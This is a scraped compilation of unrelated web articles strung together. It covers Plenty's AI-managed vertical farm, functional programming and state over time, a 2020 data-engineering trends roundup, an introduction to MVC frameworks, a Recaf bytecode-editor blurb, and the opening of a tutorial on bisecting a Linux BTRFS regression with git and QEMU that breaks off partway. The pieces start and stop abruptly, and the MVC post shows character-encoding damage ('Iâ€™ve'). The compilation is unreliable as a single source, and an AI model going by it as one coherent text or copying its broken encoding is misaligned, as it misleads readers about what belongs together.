<p>Plenty’s climate-controlled indoor farm has rows of plants growing vertically, hung from the ceiling. There are sun-mimicking LED lights shining on them, <a href="https://www.intelligentliving.co/tiny-smart-robots-kill-weeds/">robots</a> that move them around, and artificial intelligence (AI) managing all the variables of water, temperature, and light, and continually learning and optimizing how to grow bigger, faster, better crops. These futuristic features ensure every plant grows perfectly year-round. The conditions are so good that the farm produces 400 times more food per acre than an outdoor flat farm.</p>

<p>Storey said:</p>
<blockquote><p>400X greater yield per acre of ground is not just an incremental improvement, and using almost two orders of magnitude less water is also critical in a time of increasing environmental stress and climate uncertainty. All of these are truly game-changers, but they’re not the only goals.</p></blockquote>
<p>Another perk of vertical farming is locally produced food. The fruits and vegetables aren’t grown 1,000 miles away or more from a city; instead, at a warehouse nearby. Meaning, many transportation miles are eliminated, which is useful for reducing millions of tons of yearly CO2 emissions and prices for consumers. Imported fruits and vegetables are more expensive, so society’s most impoverished are at an extreme nutritional disadvantage. Vertical farms could solve this problem.</p>
<p>Storey said:</p>
<blockquote><p>Supply-chain breakdowns resulting from COVID-19 and natural disruptions like this year’s California wildfires demonstrate the need for a predictable and durable supply of products can only come from vertical farming.</p></blockquote>

<p>Plenty’s farms grow non-GMO crops and don’t use herbicides or pesticides. They recycle all water used, even capturing the evaporated water in the air. The flagship farm in San Francisco is using 100% renewable energy too.</p>
<p>Furthermore, all the packaging is 100% recyclable, made of recycled plastic, and specially designed to keep the food fresh longer to reduce food waste.</p>
<p>Storey told <a href="https://www.forbes.com/sites/johnkoetsier/2020/11/20/this-2-acre-vertical-farm-out-produces-750-acre-flat-farms/" target="_blank" rel="noopener">Forbes</a>:</p>
<blockquote><p>The future will be quite remarkable. And I think the size of the global fresh fruit and vegetable industry will be multiples of what it is today.</p></blockquote>
<p>Plenty has already received $400 million in investment capital from SoftBank, former Google chairman Eric Schmidt, and Amazon’s Jeff Bezos. It’s also struck a deal with Albertsons stores in California to supply 430 stores with fresh produce.</p>
<p>Ideally, the company will branch out, opening vertical farms across the country and beyond. There can never be too many places graced by better food growing with a less environmental cost.</p>
<p>Here’s a <a href="https://anchor.fm/techfirst/episodes/The-future-of-farms-is-vertical-400X-more-yield--95-less-water--99-less-space-emesrq/a-a3sf2o5" target="_blank" rel="noopener">TechFirst podcast</a> about the story behind Plenty:</p>

<p>Excerpted from <a href="https://softwarefordays.com/post/functional-programming-and-identity-state-and-time/#resolving-the-time-paradox">Functional Programming and the Semantics of Change, State &amp; Time</a>.</p>
<blockquote>
<p>“No man can ever cross the same river twice.” Because what’s a river? I mean, we love this idea of objects; like there’s this thing that changes. Right? There’s no river. Right? There’s water there at one point-in-time. And another point-in-time, there’s other water there. — Rich Hickey, <a href="https://github.com/matthiasn/talk-transcripts/blob/master/Hickey_Rich/AreWeThereYet.md">Are We There Yet</a>, quoting Heraclitus.</p>
</blockquote>
<p>From the perspective of a user, a functional program may appear stateful. Interact with <a href="https://softwarefordays.com/post/functional-programming-and-identity-state-and-time/#stateful-functional-programs">the functional ATM program above</a> and notice the program remembering previous encounters. On the one hand, this is not surprising. We included an imperative layer to remember previous states. Instead of decomposing the state of the program into distinct objects, like <code>bankAccount</code> and <code>withdrawalAmount</code>, we created a single global object, the <code>store</code>. On the other hand, focusing on the “object” portion of the program betrays an object-oriented predisposition. The imperative piece of the program is merely a construct used to facilitate a computation based asynchronously on another. One can even imagine a programming language where such a construct is built into the language itself, hiding any imperative implementation from the programmer’s view. In fact, such a language exists that compiles to JavaScript.<sup><a href="#fn1" id="fnref1">[1]</a></sup> In other words, it is syntax, not semantics. The semantics of the program better align with the semantics of a recursive, iterative function, having state <code>S</code> at a discrete step <code>i</code> — run the functional ATM program with the output of the previous run to produce the input for the next.</p>
<p>That a program with a functional, stateless and timeless core can maintain state is surprising, to say the least. Look around the room, bus, park or wherever you find yourself reading this sentence, and you will likely identify “a collection of distinct objects,” such as dogs, people, and trees, “whose behaviors may change over time.” Look around the functional ATM program, on the other hand, and there are no identifiable objects to be found. Yet, the program appears to have state just like any other object in the room.</p>
<p>However, the ostensible “paradox” dissipates when the augmentation of our conception of time extends beyond the functional program to include the rest of our physical reality.</p>
<blockquote>
<p>One way to resolve this paradox is to realize that it is the user’s temporal existence that imposes state on the system. If the user could step back from the interaction and think in terms of streams of balances rather than individual transactions, the system would appear stateless — <a href="https://web.mit.edu/alexmv/6.037/sicp.pdf">SICP</a> Section 3.5.5</p>
</blockquote>
<p>Instead of viewing the <em>world</em> as the sum of its objects, each reflecting its latest state as time elapses, we may also think in terms of discrete state histories. We may interpret the dog at the park as moving in discrete steps <code>S(i)</code> to <code>S(i+1)</code>, just as we interpret the state of our functional program as moving in discrete steps <code>S(i)</code> to <code>S(i+1)</code>.</p>
<p>Consider video media. To movie scenes, we may attribute the same object-oriented semantics. Character and inanimate objects shift, interact and evolve as time elapses.</p>
<video id="metavideo" poster="https://softwarefordays.com/media/metavideoposter.gif" preload="none" width="480" controls="">
    <source src="https://softwarefordays.com/media/metavideo.mp4" type="video/mp4; codecs=&quot;avc1.42E01E, mp4a.40.2&quot;">
    <img src="https://softwarefordays.com/media/metavideo.mp4" title="Your browser does not support the mp4 video codec.">
</video>
<p>While playing the above video, for example, we may conclude that “a cat is dancing.” Yet, videos are comprised of static frames stitched together in a certain sequence at discrete time intervals. Each frame corresponds to a state of the video at a moment in time and the frames, taken together, a time-denominated series of discrete states. The media chosen above is intentionally meta. The video includes a TV animation of a scene mirrored by a flip-book<sup><a href="#fn2" id="fnref2">[2]</a></sup>, showing static frames strung together at discrete time intervals, which itself is mirrored by a flip-book in “real” life, showing static frames strung together at discrete time intervals. Take another step back to notice that the above gif media (or mp4 if your browser supports html5) being played on <em>your</em> computer is comprised of static frames, strung together at discrete time intervals.</p>
<p>There is nothing stopping us from taking another step back and interpreting the real world in which your computer currently sits as static frames, strung together at discrete time intervals. We <em>may</em> attribute normal object-oriented semantics to the above gif, concluding that “a cat is dancing.” However, we may also attribute functional semantics, concluding that “a cat has arms above its head on frame fᵢ.” At a park in the real world, we may conclude that “a dog is chasing a squirrel.” However, we may also conclude that “a dog is in the running motion behind a squirrel in the running motion on frame fᵢ.” In both cases, we may identify a time-series of states instead of objects that change over time. The functional programming paradigm can be coherently applied to world and program alike.</p>
<p>With a model for discrete time in mind, it is less surprising that functional programs can appear stateful. A user of the program may be viewed as a series of states, just like the program itself. A specific series of user states, for example,</p>
<pre><code>U₀: "Open up this blog post"<br>U₁: “Select 20 option”<br>U₂: “Click withdraw”<br>...<br>U(i): Uᵢ</code></pre>
<p>directly precipitate a series of program states:</p>
<pre><code>S₀: balance:100, amount:10<br>S₁: balance:100, amount:20<br>S₂: balance:80, amount:20<br>...<br>S(i): program(Sᵢ₋₁, Eᵢ)</code></pre>
<p>In both cases, pieces of static information may be listed, one <em>after</em> another. Moreover, both lists can be plotted along the same discrete timeline <code>i</code>. User interactions come in a certain order <code>U(i)</code>, triggering a run of the program function against the result of the previous run <code>S(i-1)</code> and event data <code>E(i)</code>, in order to produce <code>S(i)</code>. Our reality can be viewed as a time-series of states, just as it can be viewed as a collection of objects. Functional programming models a time-series of states, just as as object-oriented programming models objects. When the program and world <em>alike</em> can be viewed as “streams of information that flow in the system,” (<a href="https://web.mit.edu/alexmv/6.037/sicp.pdf">SICP</a> Section 3) the world can flow into the program, and the program back into the world.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Welcome to the 23rd edition of data engineering weekly. This week's edition is a yearend special edition where we will take a more in-depth look at the trends and emerging patterns in data engineering 2020. I divided the trends into the following categories.</p><ul><li><p>Data Infrastructure</p></li><li><p>Data Architecture</p></li><li><p>Data Management</p></li></ul><p>I hope you enjoy the data engineering trends 2020, and please share your thoughts in the comments.</p><p>I know this is a long article with so many links and references. TL;DR If I had to make a top 3 prediction for 2021 and beyond, here are they.</p><ol><li><p><em><strong>Metadata management will become mainstream. The data lineage, data quality, and data discovery tools will merge into a unified data management platform.</strong></em></p></li><li><p><em><strong>Data Mesh principles will get adopted more and drive a unified data management platform.</strong></em></p></li><li><p><em><strong>Lakehouse systems like Hudi, Iceberg, Deltalake will play a significant role in shaping the data engineering architecture.</strong></em></p></li></ol><p>Now, let’s go deep into each category and see the trends and predictions. Happy reading.</p><h2><em><strong><code>Managed Data Infrastructure &amp; Serverless Computing</code></strong></em></h2><p>In 2020, We saw the cloud platforms continue adopting the open-source data infrastructure solutions—the adoption growing from AWS's EMR, Google Cloud data proc, and Azure HDInsight to the recent AWS managed Airflow.</p><p><a href="https://aws.amazon.com/blogs/aws/introducing-amazon-managed-workflows-for-apache-airflow-mwaa/"><code>Introducing Amazon Managed Workflows for Apache Airflow (MWAA)</code></a></p><p>Though opinions differ on cloud platforms packaging the opensource, the cloud-managed infrastructure certainly carry many advantages for the consumers to quickly adopt complex infrastructure and focus on the business problems.</p><h4>2021 &amp; Beyond</h4><p>The rise of serverless architecture particularly very interesting trend in data engineering. The article summarizes the serverless data ops trend</p><p><a href="https://medium.com/swlh/dawn-of-dataops-can-we-build-a-100-serverless-etl-following-ci-cd-principles-3ca587ba1ec0"><code>Dawn of DataOps: Can We Build a 100% Serverless ETL Following CI/CD Principles?</code></a></p><p>Google Cloud launched a Google Cloud Workflow as a serverless orchestration engine.</p><p><a href="https://cloud.google.com/blog/products/application-development/get-to-know-google-cloud-workflows"><code>Get to know Workflows, Google Cloud’s serverless orchestration engine</code></a></p><blockquote><p><em><code>In 2021, It is an exciting space to watch how managed data infrastructure and the rise of serverless computing merge. </code></em></p></blockquote><h2><em><strong><code>Cloud datawarehouse</code></strong></em></h2><p>At the beginning of 2010, tightly coupled computing and storage is a strategy to run large scale data processing engines. 2019 is when the industry finally declared the old way of thinking data processing no longer working and acknowledge the cloud datawarehouse system is the way to go.</p><p><a href="https://medium.com/@acmurthy/hadoop-is-dead-long-live-hadoop-f22069b264ac"><code>Hadoop is Dead. Long live Hadoop.</code></a></p><p>In 2020, Snowflake's successful IPO reassured the cloud datawarehouse systems are the future. The S3 strong read-after-write consistency guarantee is a significant step in adopting object storage for the cloud datawarehouse system, if not already.</p><p><a href="https://aws.amazon.com/blogs/aws/amazon-s3-update-strong-read-after-write-consistency/"><code>Amazon S3 Update – Strong Read-After-Write Consistency</code></a></p><h4>2021 &amp; Beyond</h4><blockquote><p><em><code>The cloud datawarehouse system will continue to dominate and increase the adoption in 2021 and beyond. It will be interesting to watch how the cloud datawarehouse systems are tightly integrating with the data management systems.</code></em></p></blockquote><h2><em><strong><code>Cost Optimization</code></strong></em></h2><p>The cloud datawarehouse systems and the managed data infrastructure adds pressure on optimizing the cost of operating the datawarehouse systems. Netflix writes about cost optimization strategies for its data warehouse system.</p><p><a href="https://netflixtechblog.com/byte-down-making-netflixs-data-infrastructure-cost-effective-fee7b3235032"><code>Byte Down: Making Netflix’s Data Infrastructure Cost-Effective</code></a></p><p>At the same time, the GPU accelerated workload can provide a strategic business advantage. Pinterest and NVIDIA shared how Pinterest using GPU acceleration for visual search.</p><p><a href="https://blogs.nvidia.com/blog/2020/12/16/pinterest-trains-visual-search-faster-nvidia-gpus/"><code>Pinterest Trains Visual Search Faster with Optimized Architecture on NVIDIA GPUs </code></a></p><h4>2021 &amp; Beyond</h4><p>I added cost optimization as a separate section since cost optimization is often an afterthought. The unpredictability of the object storage engines egress and storage cost, handling cold vs. hot data &amp; the need for specialized hardware for a specific workload will be the norm of 2021 and beyond. </p><p>Alluxio is one solution that I am aware of providing tiered data processing capabilities, though not tuned for cost optimization.</p><p><a href="https://hackernoon.com/accelerate-spark-and-hive-jobs-on-aws-s3-by-10x-with-alluxio-as-a-tiered-storage-solution-5c3s3yes"><code>Accelerate Spark and Hive Jobs on AWS S3 by 10x with Alluxio as a Tiered Storage Solution</code></a></p><blockquote><p><em><code>It will be interesting to see how data processing frameworks like Spark, Flink adopting cost optimization as the first class optimization model, cache frequently used datasets and aware of specialized workloads. </code></em></p></blockquote><h2><em><strong><code>Lakehouse</code></strong></em></h2><p>The separation of computing and storage and the scalable object storage like S3 increased the adoption of data lake principles in early 2019. One of the challenges remains to adopt object storage on the lack of transaction guarantees. The support for ACID transactions, data versioning, auditing, indexing, caching, and query optimization are vital characteristics to build large scale data systems. </p><p>In 2020, We noticed the emerging lakehouse frameworks like DataBricks Delta Lake, Apache Hudi, and Apache Iceberg.</p><p><a href="http://cidrdb.org/cidr2021/papers/cidr2021_paper17.pdf"><code>Lakehouse: A New Generation of Open Platforms that Unify Data Warehousing and Advanced Analytics</code></a></p><p>Adobe shared its Iceberg adoption story <a href="https://medium.com/adobetech/iceberg-at-adobe-88cf1950e866"><code>Iceberg at Adobe</code></a></p><p>Uber writes about its journey with Apache Hudi, and EMR now offers Hudi part of EMR</p><p><a href="https://eng.uber.com/apache-hudi-graduation/"><code>Building a Large-scale Transactional Data Lake at Uber Using Apache Hudi</code></a></p><p><a href="https://aws.amazon.com/blogs/big-data/apply-record-level-changes-from-relational-databases-to-amazon-s3-data-lake-using-apache-hudi-on-amazon-emr-and-aws-database-migration-service/"><code>Apply record level changes from relational databases to Amazon S3 data lake using Apache Hudi on Amazon EMR and AWS Database Migration Service</code></a></p><h4>2021 &amp; Beyond</h4><p><a href="https://github.com/apache/iceberg/milestone/7"><code>Icerbeg’s version 2</code></a> to support row level upsert is another interesting development to watch in 2021.</p><blockquote><p><em><code>The Lakehouse systems continue to mature and will play a major role in shaping the data engineering architecture. It will be interesting to watch how lakehouse complement or compete with the likes of Snowflake and Redshift.</code></em></p></blockquote><h2><em><strong><code>Lambda vs. Kappa vs. Lambda-less</code></strong></em></h2><p>Managing the real-time and batch computing and providing one integrated dataset view remains the main challenge in data processing.</p><p>Pinterest writes about some of the complication of Lambda Architecture and its migration journey to the Kappa architecture</p><p><a href="https://medium.com/pinterest-engineering/pinterest-visual-signals-infrastructure-evolution-from-lambda-to-kappa-architecture-f8f58b127d98"><code>Pinterest Visual Signals Infrastructure: Evolution from Lambda to Kappa Architecture</code></a></p><p>LinkedIn took an interesting approach of Lambda-Less model</p><p><a href="https://engineering.linkedin.com/blog/2020/lambda-to-lambda-less-architecture"><code>From Lambda to Lambda-less: Lessons learned</code></a></p><h4>2021 &amp; Beyond</h4><blockquote><p><em><code>There is no real-time vs. batch, it is all about the window that we process, but that is easier to say than the reality. In 2021 and beyond, I hope we will have a more innovative solution in this space.</code></em></p></blockquote><p>Apache Beam is an excellent attempt to bring the model closer. The development of Spark Streaming and the recent Apache Flink’s&nbsp;<a href="https://flink.apache.org/2020/12/15/pipelined-region-sheduling.html"><code>batch computing support</code></a>&nbsp;are some of the trends to watch.</p><h2><em><strong><code>Streaming SQL Engines &amp; OLAP Engines</code></strong></em></h2><p>Real-time computing and insights are critical for many businesses. Event sourcing is a well-established design pattern, and that brings the question of the decade. Can we join streams and compute business metrics or feed everything into OLAP databases and query it?</p><p>Confluent writes about the KSQL materialization process.</p><p><a href="https://www.confluent.io/blog/how-real-time-materialized-views-work-with-ksqldb/"><code>How Real-Time Materialized Views Work with ksqlDB, Animated</code></a></p><p>Materialize writes about joins in detail</p><p><a href="https://materialize.com/joins-in-materialize/"><code>Joins in Materialize</code></a></p><p>On the OLAP engine space Druid, Click House and Pinot adding multiple OLAP features and improves the operational efficiency. Apache Pinot is an impressive OLAP engine gaining momentum in 2020. Uber shared its experience operating Apache Pinot at scale.</p><p><a href="https://eng.uber.com/operating-apache-pinot/"><code>Operating Apache Pinot @ Uber Scale</code></a></p><h4>2021 &amp; Beyond</h4><p>Though streaming SQL engines and OLAP engines solve similar problems, I think there is a fundamental difference. Streaming SQL engines are good for pre-defined analytics, write once, and run workloads continuously. OLAP engines are good for interactive analytics when analytical queries are unknown while building the datasets.</p><blockquote><p><em><code>In 2021 and beyond I expect tighter integration among the Streaming SQL like KSQL and OLAP engines like Pinot.</code></em></p></blockquote><h2><em><strong><code>Data Quality &amp; Metadata Management</code></strong></em></h2><p>The poor data quality costs an estimated $3.1 trillion per year in the USA alone, equating to 16.5% of the GDP.!! The data quality is critical for developing a data pipeline, and your ML model is as efficient as the quality of the data.</p><p><a href="https://medium.com/@expectgreatdata/why-data-quality-is-key-to-successful-ml-ops-a18d6e373ca9"><code>Why data quality is key to successful ML Ops</code></a></p><p>We’ve seen both Microsoft and Airbnb writes about how data quality effort improved its org decision-making process.</p><p><a href="https://medium.com/data-science-at-microsoft/partnering-for-data-quality-dc9123557f8b"><code>Partnering for data quality</code></a></p><p><a href="https://medium.com/airbnb-engineering/data-quality-at-airbnb-e582465f3ef7"><code>Data Quality at Airbnb - Part 1 — Rebuilding at Scale</code></a></p><p><a href="https://medium.com/airbnb-engineering/data-quality-at-airbnb-870d03080469"><code>Data Quality at Airbnb - Part 2 — A New Gold Standard</code></a></p><p>We have seen multiple tools and systems emerged on Data Quality, and this is a pretty good summarization f the data quality ecosystem.</p><p><a href="https://medium.com/memory-leak/data-quality-a-primer-f6a945915511"><code>Data Quality — A Primer</code></a></p><p> One of the most remarkable trends of 2020 in data engineering is the emerging tooling and infrastructure to manage metadata at scale. I shared some of my thoughts about the importance of metadata in the past.</p><p>In 2020, we have seen many great articles from companies across the industry that shared their data discovery and metadata management. Data Engineering Weekly dedicated a week’s edition to focus on metadata management.</p><p><a href="https://www.dataengineeringweekly.com/p/data-engineering-weekly-21-metadata"><code>Data Engineering Weekly #21: Metadata Edition</code></a></p><p>LinkedIn organized&nbsp;<a href="https://metadataday2020.splashthat.com/"><code>Metadata Day 2020 - Metaspeak Meetup</code></a>&nbsp;as an attempt to unify people working on metadata management. Datakin announced the&nbsp;<a href="https://datakin.com/2020/12/18/introducing-openlineage/"><code>Open Lineage initiative</code></a><code>&nbsp;</code>to standardize the data lineage and the discovery effects.</p><h4>2021 &amp; Beyond</h4><p>I’ve included the data quality and the metadata management in the same section for a reason. In 2020 we saw isolated solutions to solve data lineage, data quality, and data discovery. Data Pipeline is a complex inter-dependent creation process of one dataset from another. Data lineage and data quality are two tightly coupled metadata systems that power the data discovery system.</p><blockquote><p><em><code>In 2021 and beyond, I expect all three problem spaces to merge and emerge as one unified data management platform that can provide data quality, lineage, and discovery service out of the box.</code></em></p></blockquote><h2><em><strong><code>Data Mesh</code></strong></em></h2><p>In 2020, Data Mesh emerged as de-facto principles for scale data management as the organization grows. Thoughtworks writes about the data mesh principles in the past.</p><p><a href="https://martinfowler.com/articles/data-monolith-to-mesh.html"><code>How to Move Beyond a Monolithic Data Lake to a Distributed Data Mesh</code></a></p><p><a href="https://martinfowler.com/articles/data-mesh-principles.html"><code>Data Mesh Principles and Logical Architecture </code></a></p><p>We saw number of companies started to adopt the data mesh principles and wrote …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
			
			<p>In the last few years Iâ€™ve worked or played with a bunch of MVC frameworks: <strong>Laravel</strong>, <strong>Ruby on Rails</strong>, <strong>Django</strong>, and <strong>AdonisJS</strong>.</p>

<p>With two of them (Laravel and Dango) I also have some experience in production environments. Laravel is the one I know most.</p>

<p>So, what do they all share in common? Whatâ€™s the difference between them and Express, Flask, Sinatra? This article will try to explain the philosophy around those tools.</p>



<p>The web is not only a matter of serving the right file to the user; you usually also want to:</p>

<ul>
  <li>pass arguments, values, cookies, more generally data with the request;</li>
  <li>customize the output: not only in the format (plain html, or json, or â€¦ xml if you are kink enough), but also the data in it (if you are a logged user you may want to see more things than an anonymous user; etc)</li>
  <li>handle security, that is nowadays a first class citizen</li>
  <li>handle authorization, with one of the multiple authorization schemes hat have appeared in the last few years</li>
  <li>be able to scale: in the number of concurrent users, in the size of the handled data, and in the organization of the code itself.</li>
</ul>

<p>The key point here is,<strong>people got tired of solving the same problem over and over and invented a set of tools that standardized/simplified the developerâ€™s job</strong>, allowing to focus more on the business logic than on the details.</p>

<h2 id="so-whats-this-mvc-stuff">So whatâ€™s this MVC stuff?</h2>

<p>M stands for <strong>Model</strong>, and means the data that is manipulated by the framework. In current web frameworks the Model usually corresponds to classes that map to a database (E.g. <code>Person</code> class is linked to the <code>persons</code> table).</p>

<p>V stands for <strong>View</strong> and means the way the data is presented to the user. In my small dev life Iâ€™ve seen many ways to represent this part: JSON responses for example, or plain HTML. Usually, modern MVC tools offer a template system so you can write the <em>products.html</em> page once and then inject the data to be displayed.</p>

<p>C is for <strong>Controller</strong>, the part that will do the dirty job. When a request arrives, the controller will validate the input, fetch the database, apply business rules, and pass it to the right view. Or it will trigger some other systems. <em>This is the part youâ€™ll write in some programming language</em>.</p>

<h2 id="opinionated-vs-unopinionated">Opinionated vs Unopinionated</h2>

<p>Instead of referring to MVC vs Non-MVC frameworks, I think <strong>the best classification is between <em>Opinionated</em> vs <em>Unopinionated</em></strong>. Opinionated frameworks are those that are presented in this article; they give to the dev a lot of pre-made tools with sensible defaults that will do all the heavy lifting. Sad to say, but the developerâ€™s job is sometimes just to configure these tools to make them work as needed.</p>

<p>With <em>unopinionated frameworks</em>, you are alone with a tool that handles requests and responses. You may need to write all the tools you need, and end up creating a framework yourself. An example: you may need to decide how to access the database, or handle authenticationâ€¦ In this category I see <strong>Express</strong>, <strong>Flask</strong>, <strong>Sinatra</strong>.</p>

<h2 id="the-router-in-mvc">The router in MVC</h2>

<p>Almost all the opinionated frameworks expose a functionality called <em>router</em>. Similarly to phisical routers, these pieces of software will understand the URL of a request and will route to the right controller. One can create a route for <code>/products/123</code> and the router will send this request to <code>ProductController</code> calling the appropriate function and passing the parameter <code>123</code> as argument. Isnâ€™t this lovely?</p>

<p>So when I have to debug an application I usually start from here; I try to understand where the router configuration is (usually in <code>routes.php</code> or <code>urls.py</code>), and where the route Iâ€™m interested will point, and follow it.</p>

<h2 id="the-orms">The ORMs</h2>

<p><strong>ORM</strong> stands for <em>Object Relational Mapping</em> and is a framework that allows to express sql queries using class constructs. Almost every major framework ships an ORM that is perfect for simple and sometimes elaborated queries. Basically the Model classes will extend a base class that contains all the boilerplate to read from the DB table and perform queries. For example, in Laravel:</p>

<pre><code>&lt;?php

use Illuminate\Database\Eloquent\Model;

class Flight extends Model
{
    //
}
</code></pre>

<p>The class <code>Model</code> is the base class that will give to <code>Flight</code> all the fancy methods, like:</p>

<pre><code>// Retrieve a model by its primary key...
$flight = Flight::find(1);

// Retrieve the first model matching the query constraints...
$flight = Flight::where('active', 1)-&gt;first();
</code></pre>

<h2 id="template-systems">Template systems</h2>

<p>Almost every MVC framework use a template system, so you can create HTML files with lower effort, even though itâ€™s nowadays very easy to just respond with JSON. Usually it only depends on what you return from the controller.</p>

<h2 id="command-line-utilities">Command line utilities</h2>

<p>Laravel has <strong>artisan</strong>, Python has <strong>manage.py</strong>, Rails has <strong>rake</strong>. These three command line utilities do <em>a lot</em>. They can:</p>

<ul>
  <li><strong>create and execute migrations</strong>, that are operations that will change the structure of your database. You may create a migration to add a new table or change a column., for example. You can also rollback if something doesnâ€™t go as planned. All of that without writing SQLs directly on the DB server. We use this feature on a daily basis during development.</li>
  <li>Likewise the migrations, sometimes you only want to add data in tables, like the values of a select box. This process is called <strong>seeding</strong>.</li>
  <li>Put the server on <strong>maintenance mode</strong> and resume</li>
  <li><strong>create boilerplate</strong> (models, controllers, viewsâ€¦) from command line, so that you only have to fill those generated files</li>
  <li><strong>execute tests</strong></li>
  <li><strong>create custom commands</strong>; for example, we usually create commands for operations that should be triggered by cron, or long-lasting batch commands.</li>
  <li>â€¦and much more! Every tool exposes more or less capabilities.</li>
</ul>



<p>I cannot stress out how important is documentation when using those frameworks. Itâ€™s impossible to remember all the possible commands and configurations. You end up searching through docs, and if those are well written, you donâ€™t need to pay a visit on stack overflow right away. If you write an MVC tool and it doesnâ€™t have an <em>excellent</em> documentation, with a lot of examples, it will probably not be used by anyone.</p>

<h2 id="standardization">Standardization</h2>

<p>Another thing that pays off is that, no matter whoâ€™ll work on what, all the code will look the same, and will be organized the same way. This has some value, since those kind of systems must be maintained over a span of several years, while the average dev only works only 2 years in the same company :)</p>

<h2 id="conclusions">Conclusions</h2>

<p>I hope I donâ€™t have expressed concepts that are too trivial for the average reader; these are the basic info I wish somebody told me at the time.</p>

        <h3>What is Recaf?</h3>
        <p>Recaf is an open-source Java bytecode editor that simplifies the process of editing compiled Java applications. To make things easier Recaf abstracts away much of the internal class file format. Difficult tasks such as updating stack-frames are done automatically. Along with additional features to assist in the process of editing classes, Recaf is the most feature-rich free bytecode editor available.</p>
        
        <h3>Useful Information</h3>
        <p>While Recaf makes bytecode editing a more simple process it does not mean you should dive head-first into editing compiled Java applications without understanding some basic programming concepts and the Java class file architecture. Here are some references for these topics:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
<p>Years ago, I needed to track down a specific kernel regression, and I worked out an approach to automatically bisect the kernel, leveraging a combination of git and qemu.
A few days ago, someone posted on reddit that they’d seen a massive BTRFS performance regression in the 5.10 kernel under certain circumstances, and they’d managed to track it down to a commit.  <a href="https://www.reddit.com/r/linux/comments/kieqyu/warning_linux_510_has_a_500_to_2000_btrfs/">https://www.reddit.com/r/linux/comments/kieqyu/warning_linux_510_has_a_500_to_2000_btrfs/</a></p>
<p>I thought it might be interesting to revisit what I’d done, and see if I could automatically track down this specific performance regression using it, and share my approach.</p>
<h2 id="bisection">Bisection?</h2>
<p>The linux kernel source code is managed via the version control software <code>git</code>, with the code stored in a repository.  Git is designed to be decentralised, so you can have a full copy of a repository locally, including each and every way it has changed.  Most changes involve multiple files being updated, after which you commit them to the repository, along with a description of what the commit is.</p>
<p>Most software builds up in complexity over time and will often soon grow to a level of complexity where it’s impossible for any one engineer to have full awareness of the consequences of their change, and sometimes what seems to be a straightforward change can have unexpected consequences elsewhere.  When you’re only dealing with a few commits between a last known good state and failure, it’s easy to quickly track down the specific source of the problem.  As that scales up, tracking down a bug can get increasingly hard.</p>
<p>The linux kernel often has several thousand commits between releases.  If you were to try to track down a regression commit by commit, it’d take a long time to do.  Ideally you’d want to narrow down in on a set of commits related to just where you see the regression, but the cause could always be by another change elsewhere.  One way you can drastically cut down a sorted list is to bisect your way through all the changes: taking the midpoint between a known good and known bad endpoint,  roughly halving the number of commits to be validated each step.  A quick example, assuming 1000 commits to start with (and rounding down for ease):   1000 -&gt; 500 -&gt; 250 -&gt; 125 -&gt; 62 -&gt; 31 -&gt; 15 -&gt; 7 -&gt; 3.  You can see that the number of commits to be checked very quickly got down to manageable chunks.</p>
<p>It’s worth noting that this approach has a series of assumptions baked in to it, for example we’re assuming that one commit introduced the bug.  Just because bisecting gets you down to a specific commit, doesn’t mean that only that commit is the issue.  It should act as a good starting point for investigation, however.  About 4 years ago I spent a week bisecting a kernel manually, as a somewhat background task, trying to track down what we thought was a kernel bug. What we actually found was a piece of software was making assumptions of specific behaviour from the kernel, that is explicitly stated is not guaranteed. The tracked down commit that “caused” the issue appeared to just mark a change in some optimisation in the compiler.  Fix the assumptions and problems vanished.</p>
<p>The git tool has built in native support for bisecting commits, allow you to designate commits or tags as “good” and “bad”, and then walk you through the process.  It also supports automatic bisection, if you provide it a command that will exit with a status code of 0 for good commits, and any other status code for bad commits.</p>
<h2 id="automating-kernel-bisection">Automating kernel bisection</h2>
<p>The easiest way to do this is to come up with a way to replicate the bug using a virtual machine (VM), spun up on the machine carrying out the bisection.  Build the kernel, launch a VM that uses it, and along with some way to trigger the behaviour you’re interested in.  With the need to do this in an unattended fashion, we need to use something like QEMU to handle the VM side of things, instead of something like VirtualBox.</p>
<p>The bug in question comes with replication instructions: Extract the latest firefox sources to an empty BTRFS formatted volume.  The original reporter found the time drastically increased for the operation, regardless of where the volume was, with USB storage seeing a particularly large hit.  Presumably that indicates a lot more round trip calls to storage.</p>
<p>So to automatically bisect the kernel we’re going to need:</p>
<ul>
<li>Full kernel source code checked out via git</li>
<li>QEMU installed and ideally able to run in an accelerated fashion.  In this case I found unaccelerated to be more than 10x slower for the task at hand.</li>
<li>A way to replicate the bug and pass the right status code back.  Given we’re extracting a tarball, we’ll want a full initramfs rather than a single binary initrd (In the appendix I’ll give some proformer Go and C code that could be used as a monolithic initrd)</li>
<li>A way to make an empty BTRFS volume of sufficient size for each loop.</li>
<li>A directory to do this under.</li>
</ul>
<pre><code>mkdir ~/bisecting
</code></pre><h2 id="kernel">Kernel</h2>
<p>This part is pretty straightforward.</p>
<pre><code>cd ~/bisecting/
git clone https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git
</code></pre><p>Let’s make sure we can build a known good kernel, with BTRFS enabled, and run it under QEMU.  The default configuration for linux kernel doesn’t have BTRFS enabled, so we’ll need to specifically enable it, and then enable the default options for it.  We’ll then take a copy of the configuration to use as a base for bisecting, before finally building the kernel ready to use, using every available core.</p>
<pre><code>cd ~/bisecting/linux
git checkout v5.9    # That's bbf5c979011a099af5dc76498918ed7df445635b
make defconfig
echo "CONFIG_BTRFS_FS=y" &gt;&gt; .config
make olddefconfig
cp .config ../kernelconfig
make -j $( nproc )
</code></pre><p>On the system I’m using, the QEMU binary I want is <code>qemu-system-x86_64</code>.   On RHEL8 and derivatives, it has become <code>qemu-kvm</code>, under <code>/usr/libexec</code>.  Spinning up a new VM, with 4G of ram, using KVM acceleration:</p>
<pre><code>sudo qemu-system-x86_64 -enable-kvm -nographic -append console=ttyS0 -kernel arch/x86/boot/bzImage -m 4G
</code></pre><p>You should see this launch, and ultimately result in a kernel panic after a few seconds, because it was unable to mount a root fs.  That’s expected, we didn’t give it one!  Hit <code>ctrl+a</code> and then <code>x</code>, and QEMU will terminate the VM.</p>
<p>Okay, so that’s a viable kernel. Now we need to create a BTRFS volume to pass to the machine as a local drive, before we create an initramfs to drive the experiment.</p>
<h2 id="btrfs-volume">BTRFS volume</h2>
<p>This part is super simple, but we’ll need to know how big to make it.  I’m going to use the 84.0.1 sources, and find out how big they are uncompressed</p>
